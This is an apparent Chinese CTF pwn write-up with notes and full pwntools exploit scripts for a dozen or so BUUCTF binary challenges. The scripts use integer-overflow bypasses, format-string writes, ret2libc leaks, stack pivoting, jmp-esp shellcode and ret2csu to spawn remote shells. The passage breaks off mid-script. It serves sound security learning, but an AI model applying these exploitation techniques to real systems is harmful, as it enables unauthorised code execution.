+<h1 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h1><p>64位动态链接程序，先用IDA看，发现有整数溢出的问题，然后应该就是简单ROP了</p>
+<p>![[Pasted image 20250819164230.png]]</p>
+<p>整数溢出用-1来绕过，因为后面转成了<code>unsigned int</code>，所以可以<code>read</code>很多字符</p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:26320&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+p.recvuntil(b&#39;name:\n&#39;)
+p.sendline(b&#39;-1&#39;)
+back_door = 0x400726 
+p.recvuntil(b&#39;name?\n&#39;)
+payload = b&#39;a&#39; * 0x18 + p64(back_door)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><p>32位动态链接程序。</p>
+<p>checksec了一下，十分感动，做了一周终于见到有<code>stack cananry</code>的题目了</p>
+<pre><code class="language-bash">[*] &#39;/home/spongebob/Document/pwn/pwn&#39;
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+</code></pre>
+<p>放到<code>IDA</code>里看一下<br>![[Pasted image 20250819170420.png]]<br>往<code>buf</code>里面输入内容，然后输出输入的内容，并且输出x，x是已经给定的值，那就<code>read</code>来ROP劫持到<code>if</code>块内部吧，先搞定<code>canary</code>![[Pasted image 20250819170734.png]]<br>可以看到canary在<code>buf + 0x50</code>的位置，选择将最低位<code>\x00</code>覆盖以全部打印的方式，从而泄露<code>canary</code>，<del>然后再重新劫持即可。</del><br>不对，这里发现一个问题，程序只会走一遍。如果不覆盖canary没法再次读从而进行ROP劫持了，并且<code>read(0, buf, 0x50</code>，长度不够，是不允许ROP的。但是是<code>printf</code>，考虑格式化字符串吧，但是没学过，现学一下（笑）。</p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:27020&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+x_addr=0x0804A02C
+# gdb.attach(p)
+# payload=b&quot;aaaa%12$n&quot; + p32(x_addr)
+payload=b&quot;%4c%13$n&quot; + p32(x_addr)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>要先试出来printf第一个可打印参数的位置，方式为：<br>![[Pasted image 20250820112254.png]]<br>可以看到aaaa再次被打印的位置为第11个%p，所以第一个参数的位置是11，然后要往<code>x_addr</code>里写，<code>x_addr</code>是第13个参数。<br>用<code>%n</code>，写入内容为已打印字符的个数。</p>
+<p>可以看到代码中我注释掉了一个payload，我刚开始用的就是第一个payload，直接打出4个a来表示x长度，但是没打通，然后调了一下，确定x的值是在下面的内容中被更改了：</p>
+<pre><code class="language-bash">0xf7db3ab4 &lt;printf+36&gt;    call   __vfprintf_internal         &lt;__vfprintf_internal&gt;
+</code></pre>
+<p>里面具体发生了什么？<br>一步一步调，发现是这个函数触发了</p>
+<pre><code class="language-bash">printf_positional
+</code></pre>
+<p>![[Pasted image 20250820150937.png]]<br>这里有很多次循环，每次循环对<code>ebx</code>+1，然后对<code>edi</code>作处理<br>![[Pasted image 20250820151143.png]]<br>当ebx循环到13的时候，循环应该是结束了，然后开始一系列奇怪的操作（我没看懂XD），紧接着突然有一步：<br>![[Pasted image 20250820151654.png]]<br>可以看到给x赋值这步出现了，现在需要重新来看仔细看一下在这之前都发生了什么。进入<code>printf_positional</code>后，给<code>*printf_positional+859</code>打断点，可以看到确实是循环，直到<code>ebx=13</code>为止，看上去很像我们传入的<code>payload = b&quot;%4c%13$n&quot; + p32(x_addr)</code>，给第13个参数赋值。<br>![[Pasted image 20250820152359.png]]<br>粘出上面这张图是因为我发现这张图我能看懂（bushi<br>eax左移四位，然后去eax+ecx地址处的值存入eax，发现ecx+eax不就是刚开始<code>printf</code>栈上第13个参数吗（给x赋值为3的）<br>![[Pasted image 20250820152641.png]]<br>然后就在这里水灵灵的给x赋值了（bushi，我怎么没注意到栈里啥时候多了个4啊，<code>ebp+0x10</code>的值什么时候变成4了）</p>
+<p>找到了一篇比较好的文章描述<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-285054.htm#msg_header_h2_1">printf</a>函数的内部机制</p>
+<p>libc 是&#x3D;&#x3D;GNU C Library&#x3D;&#x3D;的缩写，是GNU 发布的C 标准库，也是Linux 系统中最常用的C 语言运行时库(runtime library)。它为开发人员提供了大量的API，包括系统调用封装和标准C 库函数，是许多程序运行的基础。</p>
+<p>GLibC通过<code>ldbl_strong_alias</code>将<code>printf</code>设置成了<code>__printf</code>的别名。</p>
+<p><code>ldbl_strong_alias</code>的实现依托于GCC的<code>__attribute__</code>和<code>alias</code>关键字实现</p>
+<pre><code class="language-c">#define _strong_alias(name, aliasname) \
+    extern __typeof (name) aliasname __attribute__ ((alias (#name))) __attribute_copy__ (name);
+#define strong_alias(name, aliasname) _strong_alias(name, aliasname)
+#define ldbl_strong_alias(name, aliasname) strong_alias (name, aliasname)
+</code></pre>
+<p>看下<code>__printf</code>的定义，其中有我们之前碰到的<code>__vfprintf_internal</code></p>
+<pre><code class="language-c">int
+__printf (const char *format, ...)
+&#123;
+  va_list arg;
+  int done;
+  va_start (arg, format);
+  done = __vfprintf_internal (stdout, format, arg, 0);
+  va_end (arg);
+  return done;
+&#125;
+</code></pre>
+<p>这样就都对上了</p>
+<pre><code class="language-c">vfprintf
+    -&gt; printf_positional
+        -&gt; va_arg
+</code></pre>
+<h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>64位，动态链接，checksec结果：</p>
+<pre><code class="language-bash">[*] &#39;/home/spongebob/Document/pwn/pwn&#39;
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+</code></pre>
+<p>什么保护都没开，鉴定为简单ROP（笑）<br>没有后门函数以及<code>system</code>这些，还要<code>libc</code>泄漏XD </p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:28760&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+puts_plt = elf.plt[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+read_got = elf.got[&#39;read&#39;]
+pop_rdi_ret = 0x0000000000400733
+vuln = 0x000000000040067D
+
+#-----泄露 libc-----#
+p.recvuntil(b&#39;story!\n&#39;)
+payload=b&quot;a&quot; * 0x28 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vuln)
+p.sendline(payload)
+puts_addr = u64(p.recvline()[0:6].strip().ljust(8, b&#39;\x00&#39;))
+read_addr = u64(p.recvline()[0:6].strip().ljust(8, b&#39;\x00&#39;))
+print(f&quot;puts_addr: &#123;hex(puts_addr)&#125;&quot;)
+print(f&quot;read_addr: &#123;hex(read_addr)&#125;&quot;)
+libc = puts_addr - 	0x6f690
+system = libc + 0x45390
+bin_sh = libc + 0x18cd57
+
+#-----ROP-----#
+p.recvuntil(b&#39;story!\n&#39;)
+payload = b&quot;a&quot; * 0x28 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>第一次五分钟秒了一道泄露<code>libc</code>的题目，记录一下</p>
+<h1 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h1><p>64位动态链接程序</p>
+<pre><code class="language-bash">[*] &#39;/home/spongebob/Document/pwn/pwn&#39;
+    Arch:       amd64-64-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+</code></pre>
+<p>什么保护也没开。然后有<code>read</code>的栈溢出，并且有后门函数<code>good_game</code></p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:27592&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+p.recvuntil(b&#39;message:\n&#39;)
+good_game = 0x400620
+payload = b&#39;a&#39; * 0x88 + p64(good_game)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>^3e2b39</p>
+<p>32位动态链接，也是什么保护都没开</p>
+<pre><code class="language-bash">[*] &#39;/home/spongebob/Document/pwn/pwn&#39;
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+</code></pre>
+<p>ROP到函数hack。好吧被耍了（笑）。应该是格式化字符串漏洞，想办法改掉system(“”)里面的内容为<code>/bin/sh</code>。覆盖任意地址为字符串？（）这该怎么改<br>不会做，看了下wp的思路，原来是<code>ret2text</code>+<code>stack_migration</code>。又接触到新的知识了orz，看一下栈迁移怎么做吧～</p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:26066&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+hack = 0x0804854B
+command = 0x080486C0
+leave_ret = 0x08048562
+system_addr = 0x08048400
+# gdb.attach(p)
+p.recvline()
+payload = b&#39;a&#39; * 0x27 + b&#39;b&#39;
+p.send(payload)
+p.recvuntil(b&#39;b&#39;)
+ebp = u32(p.recv(4).ljust(4, b&#39;\x00&#39;))
+print(f&quot;old_ebp: &#123;hex(ebp)&#125;&quot;)
+s = ebp-0x38
+bin_sh = s + 0x10
+
+payload = b&#39;a&#39; * 4 + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh) + b&#39;/bin/sh&#39;
+payload = payload.ljust(0x28, b&#39;\x00&#39;)
+payload = payload+ p32(s) + p32(leave_ret)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>第一遍<code>read</code>覆盖掉<code>old_ebp</code>之前的所有栈空间，使得<code>printf</code>的时候可以将<code>old_ebp</code>的值也打印出来，再根据调试计算出<code>old_ebp</code>和<code>s</code>之间的地址偏移。然后就能够在第二次<code>read</code>前得到<code>s</code>的地址。用<code>s</code>的地址覆盖原<code>old_ebp</code>的位置，通过为了栈迁移，将<code>return_addr</code>覆盖为<code>leave_ret</code>的地址。这样就会执行两次<code>leave; ret</code>，<code>leave</code>相当于<code>mov ebp, esp; pop ebp</code>。<code>ret</code>弹出当前栈帧到<code>eip</code>以执行，即：<code>pop eip</code></p>
+<p>两次<code>leave; ret</code>实现了<code>esp</code>和<code>ebp</code>的控制 -&gt; 控制栈的位置，并且我们能够提前布置栈。</p>
+<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>64位动态链接</p>
+<pre><code class="language-bash">[*] &#39;/home/spongebob/Document/pwn/pwn&#39;
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+</code></pre>
+<p>只开了NX</p>
+<p>![[Pasted image 20250821093547.png]]</p>
+<p>可以看到会将写的最后一个字符给改为0，如果只ROP到<code>return addr</code>，会改掉，多打一个字符就行(猜测)，同样要<code>libc</code>泄漏</p>
+<p>程序里面没有<code>puts</code>，有<code>printf</code>。做到这里发现对栈溢出的操作了解还是太少了，于是做个[总结]吧</p>
+<p>利用<code>printf</code>作泄漏，构造<code>printf(&quot;%s&quot;, got[read])</code></p>
+<p>问题是<code>%s</code>从哪里搞？实在没有办法只能自己往栈上写，然后想办法搞到写的位置的地址，类似的方式在[[pwn(2025.8.20)#^3e2b39|ciscn_2019_es_2]]遇到过。但是这里实际上是有<code>%s</code>的，题目中有已经存在的<code>printf</code>里面有，直接用。泄露完基地址直接打就行了。</p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+# Local = True 
+Local = False
+# context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:27572&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+rl = lambda x, a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda text = &#39;&#39;: gdb.attach(p, text)
+
+elf = ELF(&#39;./pwn&#39;)
+libc = ELF(&#39;./libc.so.6&#39;)
+
+pop_rdi_ret = 0x400733
+main = 0x400636
+pop_rsi_r15_ret = 0x400731
+printf = 0x4004F0
+read_got = elf.got[&#39;read&#39;]
+s = 0x400770
+main = 0x400636
+
+# dbg(&quot;b read&quot;)
+ru(b&#39;name?&#39;)
+payload = 0x27 * b&#39;a&#39; + b&#39;b&#39; + p64(pop_rdi_ret) + p64(s) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(0x0) + p64(printf) + p64(main) + b&#39;a&#39;
+sd(payload)
+ru(b&#39;!&#39;)
+ru(b&#39;again, &#39;)
+read_addr = u64(rv(6).ljust(8, b&#39;\x00&#39;))
+print(f&quot;read_addr: &#123;hex(read_addr)&#125;&quot;)
+libc_addr = read_addr - 0xf7250
+system = libc_addr + 0x45390
+bin_sh = libc_addr + 0x18cd57
+ru(b&#39;name? &#39;)
+payload = 0x27 * b&#39;a&#39; + b&#39;b&#39; + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + b&#39;a&#39;
+sd(payload)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>flag</p>
+<h1 id="X-CTF-Quals-2016-b0verfl0w-Stack-Pivoting"><a href="#X-CTF-Quals-2016-b0verfl0w-Stack-Pivoting" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w [Stack Pivoting]"></a>X-CTF Quals 2016 - b0verfl0w [Stack Pivoting]</h1><p>^f9bd12</p>
+<p>32位动态链接程序：<br>![[Pasted image 20250821114711.png]]<br>溢出长度只有0x10字节，不够放一般的<code>shellcode</code>，所以考虑将shellcode写到栈上，然后利用一些方式做栈迁移。这道题中有一个<code>gadget</code>为：<code>jmp esp</code>，所以可以想办法修改<code>esp</code>使得<code>esp</code>指向<code>shellcode</code>所在的位置。但是<code>shellcode</code>所在位置为<code>return_addr - 0x24</code>，所以将返回地址先改为<code>jmp esp</code>，然后下一个栈帧改为<code>sub esp, 0x28; jmp esp</code>，就能够跳到<code>s</code>的位置，即我们输入<code>shellcode</code>的地方。</p>
+<p>常见的<code>shellcode</code>可以在<a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">这里</a>寻找</p>
+<p>最后的代码为：</p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+Local = True
+# Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:26066&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./ret2reg&#39;)
+else:
+    p = remote(HOST, POST)
+
+
+rl = lambda x, a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda: gdb.attach(p)
+
+
+jmp_esp = 0x08048504
+sub_esp_jmp = b&#39;\x83\xec(\xff\xe4&#39;
+shell_code = b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;
+#---------begin--------#
+dbg()
+
+ru(b&quot;What&#39;s your name?\n&quot;)
+
+payload = shell_code + b&#39;a&#39; * (0x24-len(shell_code)) + p32(jmp_esp) + sub_esp_jmp
+sl(payload)
+ia()
+</code></pre>
+<p>rop，加了一些限制条件</p>
+<pre><code class="language-python">from pwn import *
+context.update(arch=&#39;i386&#39;, os=&#39;linux&#39;)
+# Local = True 
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:25006&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+rl = lambda x, a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda text = &#39;&#39;: gdb.attach(p, text)
+
+elf = ELF(&#39;./pwn&#39;)
+pop_ebx_ret = 0x0804840d
+win1 = 0x080485CB
+win2 = 0x080485D8
+flag = 0x0804862B
+# dbg(&quot;&quot;&quot;
+#     b flag
+# &quot;&quot;&quot;)
+ru(b&#39;Enter your input&gt; &#39;)
+payload = p32(0xDEADBAAD) + b&#39;\x00&#39; + b&#39;a&#39; * (0x1c - 0x5) + p32(win1) + p32(win2) + p32(pop_ebx_ret) + p32(0xBAAAAAAD) + p32(flag) +p32(0) + p32(0xDEADBAAD) + b&#39;\x00&#39;
+sl(payload)
+
+p.interactive()
+</code></pre>
+<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>首先要想办法绕过<code>atoi</code>从而能够实现<code>ROP</code>。有一个函数<code>dosomething</code>里面有<code>int 0x80</code>系统调用，想办法用这个函数得到<code>shell</code>。emmm做的时候最终没选择这样，ROP <code>system(&#39;/bin/sh&#39;)</code>得到的shell。</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+
+context.update(arch=&#39;i386&#39;, os=&#39;linux&#39;)
+# Local = True 
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:27531&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+rl = lambda a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda text = &#39;&#39;: gdb.attach(p, text)
+
+elf = ELF(&#39;./pwn&#39;)
+libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+pop_ebx_ret = 0x0804840d
+win1 = 0x080485CB
+win2 = 0x080485D8
+flag = 0x0804862B
+# dbg(&quot;&quot;&quot;
+#     b vuln
+# &quot;&quot;&quot;)
+ru(b&#39;How many bytes do you want me to read? &#39;)
+sl(b&#39;-1&#39;)
+ru(b&#39;data!\n&#39;)
+# get return addr
+
+str1 = 0x080486F8
+vuln = 0x0804852F
+printf = elf.plt[&#39;printf&#39;]
+printf_got = elf.got[&#39;printf&#39;]
+getchar_got = elf.got[&#39;getchar&#39;]
+atoi_got = elf.got[&#39;atoi&#39;]
+pop_2_ret = 0x0804864e
+# leak address of libc by printf
+payload = b&#39;a&#39; * (0x2c + 0x4 - 0x1) + b&#39;b&#39;
+payload += p32(printf) + p32(vuln) + p32(str1) + p32(printf_got)
+sl(payload)
+rl()
+ru(b&#39;You said: &#39;)
+printf_addr = u32(rv(4))
+print(f&quot;printf_Addr: &#123;hex(printf_addr)&#125;&quot;)
+obj = LibcSearcher(&quot;printf&quot;, printf_addr)
+# libc_addr = getchar_addr - libc.sym[&#39;atoi&#39;]
+libc_addr = printf_addr - obj.dump(&#39;printf&#39;)
+
+system = libc_addr + obj.dump(&#39;system&#39;)
+bin_sh = libc_addr + obj.dump(&#39;str_bin_sh&#39;)
+# system = libc_addr + libc.sym[&#39;system&#39;]
+# bin_sh = libc_addr + next(libc.search(&#39;/bin/sh\x00&#39;))
+
+# system(&#39;/bin/sh&#39;)
+ru(b&#39;How many bytes do you want me to read? &#39;)
+sl(b&#39;-1&#39;)
+ru(b&#39;data!\n&#39;)
+# get return addr
+payload = b&#39;a&#39; * 0x30 + p32(system) + p32(vuln) + p32(bin_sh)
+sl(payload)
+p.interactive()
+</code></pre>
+<p>因为一直没找到<code>libc</code>，远程打不通，本地还是很好打的</p>
+<h1 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h1><p>32位，只开启 NX enable<br>![[Pasted image 20250827151704.png]]<br>只能溢出8字节，后门函数为<code>shell</code>。</p>
+<pre><code class="language-python">from pwn import *
+context.update(arch=&#39;i386&#39;, os=&#39;Linux&#39;)
+p = remote(&#39;node5.buuoj.cn&#39;, 29329)
+p.recvline()
+p.recvline()
+p.recvline()
+p.recvline()
+shell = 0x0804851B
+payload = b&#39;a&#39; * 0x1c + p32(shell)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>也是简单的ROP，只开启了NX enable<br>直接打</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+context.update(arch=&#39;i386&#39;, os=&#39;Linux&#39;)
+context.log_level = &quot;debug&quot;
+p = remote(&#39;node5.buuoj.cn&#39;, 27777)
+
+elf=ELF(&#39;./pwn&#39;)
+write_plt = elf.plt[&#39;write&#39;]
+write_got = elf.got[&#39;write&#39;]
+main = 0x08048484
+#------leak libc addr------#
+payload = (0x88+0x4) * b&#39;a&#39; + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
+p.recvuntil(b&#39;Input:\n&#39;)
+p.sendline(payload)
+write = u32(p.recv(4))
+print(f&quot;write_addr: &#123;hex(write)&#125;&quot;)
+obj = LibcSearcher(&quot;write&quot;, write)
+libc = write - obj.dump(&#39;write&#39;)
+system = libc + obj.dump(&#39;system&#39;)
+bin_sh = libc + obj.dump(&#39;str_bin_sh&#39;)
+p.recvuntil(b&#39;Input:\n&#39;)
+payload = (0x88 + 0x4) * b&#39;a&#39; + p32(system) + p32(main) + p32(bin_sh)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>64位，只开启了NX保护</p>
+<pre><code class="language-python">
+</code></pre>
+<p>![[Pasted image 20250828091840.png]]<br><code>call function_addr</code> 会将下一条指令压栈，然后跳转到函数地址开始执行。我这里传入了<code>ret</code>，所以最终栈的结构不变，也不会影响ROP链。<br>![[Pasted image 20250828092130.png]]<br>下图是执行完<code>call qword ptr [r12]</code>的结果<br>![[Pasted image 20250828091932.png]]<br>这个题目是近期做的相对比较麻烦的，利用思路比较简单，但有一些细节需要注意，中间遇到了几个点：</p>
+<ol>
+<li>ret2csu之后，对参数设置，由于是<code>mov edi, r15d</code>，所以其实<code>/bin/sh</code>的地址在这个时候是传不过来的，需要在后面再次传一下。</li>
+<li><code>call qword pttr [r12 + rbp*8]</code>这一步，r12存的是一个函数的中间地址。<code>call</code>是将地址压栈，然后跳转到函数地址开始执行。这里选择了直接传了一个<code>ret</code>，可以让栈上结构不变，然后接着ROP后面的过程。</li>
+<li>需要向栈内手动写入<code>/bin/sh</code>，并且通过泄露栈的地址来计算<code>/bin/sh</code>的地址达到目的。</li>
+</ol>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+
+context.update(arch=&#39;i386&#39;, os=&#39;linux&#39;)
+# Local = True 
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:25639&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+rl = lambda a=False: p.recvline(a)
+ru = lambda x: p.recvuntil(bytes(x))
+rv = lambda x: p.recv(x)
+sl = lambda x: p.sendline(x)
+sd = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+dbg = lambda text = &#39;&#39;: gdb.attach(p, text)
+
+elf = ELF(&#39;./pwn&#39;)
+libc_start_main = elf.got[&#39;__libc_start_main&#39;]
+
+# dbg(&#39;b vuln&#39;)
+
+pop_addr = 0x40059A
+arg_set = 0x400580
+sys_call = 0x400517
+execve = 0x4004E2
+vuln = 0x4004ED
+ret = 0x4003a9
+pop_rdi = 0x4005a3
+# write /bin/sh into stack
+payload = b&#39;/bin/sh\x00&#39; + p64(ret) + (0x10 - len(&#39;/bin/sh\x00&#39;) - 0x8) * b&#39;a&#39; + p64(vuln)
+
+# get the address of &#39;/bin/sh&#39;
+sl(payload)
+
+rv(0x20)
+old_ebp = u64(rv(6).strip().ljust(8, b&#39;\x00&#39;))
+print(f&quot;old_ebp: &#123;hex(old_ebp)&#125;&quot;)
+buf =  0x7ffc783316d0
+ebp = 0x7ffc7833321b
+bin_sh = old_ebp + buf - ebp
+bin_sh = old_ebp - 0x118
+ret_addr = bin_sh + 0x8
+print(f&quot;bin_sh: &#123;hex(bin_sh)&#125;&quot;)
+
+#execve(&#39;/bin/sh&#39;, 0, 0) pop_rdi_esi_rdx ret
+payload = b&#39;/bin/sh\x00&#39; + p64(ret) + (0x10 - len(&#39;/bin/sh\x00&#39;) - 0x8) * b&#39;a&#39; + p64(execve) + p64(pop_addr) + p64(0) + p64(1) + p64(ret_addr) + p64(0) + p64(0) + p64(bin_sh) + p64(arg_set) + p64(0) * 7 + p64(pop_rdi) + p64(bin_sh) + p64(sys_call)
+sl(payload)
+p.interactive()
+</code></pre>
+<p>解法2：</p>
+<p>在网上看到一些 Sigreturn Oriented Programming攻击 的方式解本题。将[[|SROP]]的相关内容在<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85810">这篇文章</a>了</p>
+<p>用这样的方法可以直接设置寄存器的值从而调用任意的系统调用。</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+
+context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+Local = True 
+# Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:25639&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
